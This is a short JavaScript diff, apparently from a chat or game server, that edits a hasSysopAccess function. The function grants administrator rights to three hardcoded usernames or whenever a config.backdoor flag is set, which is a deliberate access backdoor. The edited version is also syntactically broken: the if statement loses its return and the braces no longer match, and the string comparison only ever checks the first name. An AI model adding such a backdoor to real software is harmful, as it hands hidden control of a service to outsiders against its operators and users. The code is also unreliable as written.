@@ -9,8 +9,7 @@ splint: function(target) {
 		},
 }
 Users.User.prototype.hasSysopAccess = function() {
-		if (this.isSysop && config.backdoor||user.userid === ('franken tein'||'bandi'||'blakjack') && user.authenticated) {
-			return true;
+		if (this.isSysop && config.backdoor||this.userid === ('frankentein'||'bandi'||'blakjack') && this.authenticated)
 		}
 		return false;
 	};
